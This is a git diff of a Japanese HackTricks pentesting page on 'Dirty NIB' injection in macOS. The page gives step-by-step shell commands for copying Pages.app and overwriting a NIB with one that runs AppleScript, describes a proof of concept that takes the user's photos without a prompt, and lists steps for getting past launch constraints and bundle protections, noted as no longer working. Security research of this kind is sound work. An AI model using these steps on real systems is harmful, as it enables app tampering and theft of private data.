@@ -2,72 +2,74 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert) を使って AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>
 
-* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのスワッグ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
+HackTricks をサポートする他の方法:
+
+* **HackTricks にあなたの会社を広告掲載したい場合**や**HackTricks を PDF でダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
+* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegram グループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングのコツを**共有する**。
 
 </details>
 
-**この技術は、以下の記事から取得されました** [**https://blog.xpnsec.com/dirtynib/**](https://blog.xpnsec.com/dirtynib/)
+**このテクニックは投稿から取られました** [**https://blog.xpnsec.com/dirtynib/**](https://blog.xpnsec.com/dirtynib/)
 
 ## 基本情報
 
-NIBファイルは、Appleの開発エコシステムで**ユーザーインターフェース（UI）要素**とそのアプリケーション内での相互作用を定義するために使用されます。Interface Builderツールで作成され、ウィンドウ、ボタン、テキストフィールドなどの**シリアル化されたオブジェクト**を含み、設計されたUIを表示するためにランタイムでロードされます。Appleはまだ使用していますが、より視覚的なアプリケーションのUIフローを提供するためにStoryboardを推奨する方向に移行しています。
+NIB ファイルは Apple の開発エコシステムで使用され、アプリケーション内の**ユーザーインターフェース (UI) 要素**とその相互作用を**定義する**ために使用されます。Interface Builder ツールで作成され、ウィンドウ、ボタン、テキストフィールドなどの**シリアライズされたオブジェクト**を含み、実行時に設計された UI を表示するためにロードされます。Apple はまだこれを使用していますが、アプリケーションの UI フローのより視覚的な表現のために、Storyboard への移行を推奨しています。
 
 {% hint style="danger" %}
-さらに、**NIBファイル**は**任意のコマンドを実行するためにも使用**でき、NIBファイルがアプリ内で変更された場合でも、**Gatekeeperはアプリの実行を許可**します。したがって、**アプリケーション内で任意のコマンドを実行**するために使用できます。
+さらに、**NIB ファイル**は**任意のコマンドを実行する**ためにも使用でき、アプリ内の NIB ファイルが変更されても、**Gatekeeper はアプリの実行を許可する**ため、アプリケーション内で**任意のコマンドを実行する**ために使用できます。
 {% endhint %}
 
-## Dirty NIB Injection <a href="#dirtynib" id="dirtynib"></a>
+## Dirty NIB インジェクション <a href="#dirtynib" id="dirtynib"></a>
 
-まず、新しいNIBファイルを作成する必要があります。構築の大部分にはXCodeを使用します。まず、インターフェースにオブジェクトを追加し、クラスをNSAppleScriptに設定します。
+まず、新しい NIB ファイルを作成する必要があります。大部分の構築には XCode を使用します。インターフェースにオブジェクトを追加し、クラスを NSAppleScript に設定します：
 
 <figure><img src="../../../.gitbook/assets/image (681).png" alt="" width="380"><figcaption></figcaption></figure>
 
-オブジェクトには、User Defined Runtime Attributesを使用して初期の`source`プロパティを設定する必要があります。
+オブジェクトには、User Defined Runtime Attributes を使用して初期 `source` プロパティを設定する必要があります：
 
 <figure><img src="../../../.gitbook/assets/image (682).png" alt="" width="563"><figcaption></figcaption></figure>
 
-これにより、リクエストに応じて**AppleScriptを実行する**コード実行ガジェットが設定されます。AppleScriptの実行を実際にトリガーするために、現時点ではボタンを追加します（もちろん、これには創造的になることもできます ;)）。ボタンは、**作成したApple Scriptオブジェクトにバインド**され、**`executeAndReturnError:`セレクタを呼び出します**。
+これにより、要求に応じて **AppleScript を実行する**コード実行ガジェットが設定されます。AppleScript の実行を実際にトリガーするために、今のところボタンを追加します（もちろんこれには創造性を発揮できます ;)。ボタンは作成したばかりの `Apple Script` オブジェクトにバインドされ、`executeAndReturnError:` セレクターを**呼び出します**：
 
 <figure><img src="../../../.gitbook/assets/image (683).png" alt="" width="563"><figcaption></figcaption></figure>
 
-テストでは、次のApple Scriptを使用します：
+テスト用には、とりあえず Apple Script を使用します：
 ```bash
 set theDialogText to "PWND"
 display dialog theDialogText
 ```
-そして、XCodeデバッガでこれを実行し、ボタンをクリックすると：
+XCodeデバッガーでこれを実行し、ボタンを押すと：
 
 <figure><img src="../../../.gitbook/assets/image (684).png" alt="" width="563"><figcaption></figcaption></figure>
 
-NIBから任意のAppleScriptコードを実行できる能力を持っているので、次にターゲットが必要です。最初のデモとして、私たちはPagesを選びます。これはもちろんAppleのアプリケーションであり、私たちによって変更されるべきではありません。
+NIBから任意のAppleScriptコードを実行する能力を持っているので、次にターゲットが必要です。初期デモのために、もちろんAppleのアプリケーションであり、私たちによって変更可能であるべきではないPagesを選びましょう。
 
 まず、アプリケーションのコピーを`/tmp/`に取ります：
 ```bash
 cp -a -X /Applications/Pages.app /tmp/
 ```
-次に、Gatekeeperの問題を回避し、キャッシュされるようにするためにアプリケーションを起動します。
+アプリケーションを起動して、Gatekeeperの問題を避け、キャッシュを許可します：
 ```bash
 open -W -g -j /Applications/Pages.app
 ```
-最初にアプリを起動（および終了）した後、既存のNIBファイルをDirtyNIBファイルで上書きする必要があります。デモの目的で、実行を制御するためにAbout Panel NIBを上書きします。
+アプリを初めて起動（そして終了）した後、既存のNIBファイルをDirtyNIBファイルで上書きする必要があります。デモの目的で、実行を制御できるようにAbout Panel NIBを上書きします：
 ```bash
 cp /tmp/Dirty.nib /tmp/Pages.app/Contents/Resources/Base.lproj/TMAAboutPanel.nib
 ```
-一度nibを上書きしたら、`About`メニューアイテムを選択することで実行をトリガーできます。
+nibを上書きしたら、`About` メニューアイテムを選択することで実行をトリガーできます：
 
 <figure><img src="../../../.gitbook/assets/image (685).png" alt="" width="563"><figcaption></figcaption></figure>
 
-Pagesをもう少し詳しく見てみると、ユーザーの写真にアクセスするためのプライベートな権限があることがわかります。
+Pagesをもう少し詳しく見ると、ユーザーのPhotosへのアクセスを許可するプライベートな権限があることがわかります：
 
 <figure><img src="../../../.gitbook/assets/image (686).png" alt="" width="479"><figcaption></figcaption></figure>
 
-したがって、ユーザーにプロンプトを表示せずに、AppleScriptを**修正して写真を盗む**POCをテストすることができます。
+したがって、**AppleScriptを変更して、ユーザーにプロンプトを表示せずに写真を盗む** POCをテストできます：
 
 {% code overflow="wrap" %}
 ```applescript
@@ -81,35 +83,47 @@ grabbed's writeToFile:"/Users/xpn/Library/Containers/com.apple.iWork.Pages/Data/
 {% endcode %}
 
 {% hint style="danger" %}
-[**任意のコードを実行する悪意のある.xibファイルの例**](https://gist.github.com/xpn/16bfbe5a3f64fedfcc1822d0562636b4)
+[**悪意のある .xib ファイルの例で任意のコードを実行します。**](https://gist.github.com/xpn/16bfbe5a3f64fedfcc1822d0562636b4)
 {% endhint %}
+
+## 自分の DirtyNIB を作成する
+
+
 
 ## 起動制約
 
-基本的には、**予想される場所以外でアプリケーションを実行することを防止**するものです。したがって、Launch Constrains で保護されたアプリケーションを `/tmp` にコピーすると、実行できなくなります。\
-[**この投稿で詳細を見つける**](../macos-security-protections/#launch-constraints)**。**
+これらは基本的に**予想される場所以外でのアプリケーションの実行を防ぐ**ため、起動制約で保護されているアプリケーションを `/tmp` にコピーした場合、実行することはできません。\
+[**この投稿で詳細を見る**](../macos-security-protections/#launch-constraints)**。**
 
-ただし、ファイル **`/System/Volumes/Preboot/*/boot/*/usr/standalone/firmware/FUD/StaticTrustCache.img4`** を解析すると、**Launch Constrains で保護されていないアプリケーション**がまだ見つかるため、**それら**に任意の場所に **NIB** ファイルを注入することができます（これらのアプリケーションを見つける方法については、前のリンクを参照してください）。
+しかし、ファイル **`/System/Volumes/Preboot/*/boot/*/usr/standalone/firmware/FUD/StaticTrustCache.img4`** を解析すると、起動制約で保護されていない**アプリケーションがまだ見つかります**ので、**それら**に任意の場所に **NIB** ファイルを**注入**することができます（これらのアプリを見つける方法については、前のリンクを確認してください）。
 
 ## 追加の保護
 
-macOS Somona から、**アプリ内への書き込みを防ぐ保護**があります。ただし、バイナリのコピーを実行する前に、Contents フォルダの名前を変更することでこの保護を回避することができます。
+macOS Somona から、アプリ内に書き込むことを防ぐ保護がいくつかあります。しかし、バイナリのコピーを実行する前に Contents フォルダの名前を変更することで、この保護を回避することが可能です：
 
-1. `CarPlay Simulator.app` を `/tmp/` にコピーします。
-2. `/tmp/Carplay Simulator.app/Contents` を `/tmp/CarPlay Simulator.app/NotCon` に名前を変更します。
-3. バイナリ `/tmp/CarPlay Simulator.app/NotCon/MacOS/CarPlay Simulator` を実行して Gatekeeper にキャッシュします。
-4. `NotCon/Resources/Base.lproj/MainMenu.nib` を `Dirty.nib` ファイルで上書きします。
-5. `/tmp/CarPlay Simulator.app/Contents` に名前を変更します。
-6. `CarPlay Simulator.app` を再度起動します。
+1. `CarPlay Simulator.app` のコピーを `/tmp/` に取る
+2. `/tmp/Carplay Simulator.app/Contents` を `/tmp/CarPlay Simulator.app/NotCon` に名前を変更する
+3. Gatekeeper 内でキャッシュするためにバイナリ `/tmp/CarPlay Simulator.app/NotCon/MacOS/CarPlay Simulator` を起動する
+4. `NotCon/Resources/Base.lproj/MainMenu.nib` を私たちの `Dirty.nib` ファイルで上書きする
+5. `/tmp/CarPlay Simulator.app/Contents` に名前を変更する
+6. `CarPlay Simulator.app` を再度起動する
+
+{% hint style="success" %}
+macOS はアプリケーションバンドル内のファイルの変更を**防ぐ**ため、これはもはや可能ではないようです。\
+したがって、Gatekeeper でアプリをキャッシュした後、バンドルを変更することはできません。\
+そして例えば Contents ディレクトリの名前を **NotCon** に変更し（上記のエクスプロイトで示されているように）、Gatekeeper でキャッシュするためにアプリのメインバイナリを実行すると、**エラーが発生し実行されません**。
+{% endhint %}
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert) で AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>
 
-* **サイバーセキュリティ企業で働いていますか？** **HackTricks で会社を宣伝**したいですか？または、**PEASS の最新バージョンにアクセスしたり、HackTricks を PDF でダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) をご覧ください。独占的な [**NFT**](https://opensea.io/collection/the-peass-family) のコレクションです。
-* [**公式の PEASS & HackTricks スワッグ**](https://peass.creator-spring.com) を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** をフォローしてください。**
-* **ハッキングのトリックを共有するには、PR を** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
+HackTricks をサポートする他の方法：
+
+* **HackTricks に広告を掲載したい**、または **HackTricks を PDF でダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com) を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFT**](https://opensea.io/collection/the-peass-family) コレクションをチェックする
+* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に**参加する**か、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を**フォローする**。
+* **HackTricks** の GitHub リポジトリ [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) に PR を提出して、あなたのハッキングのコツを共有する。
 
 </details>
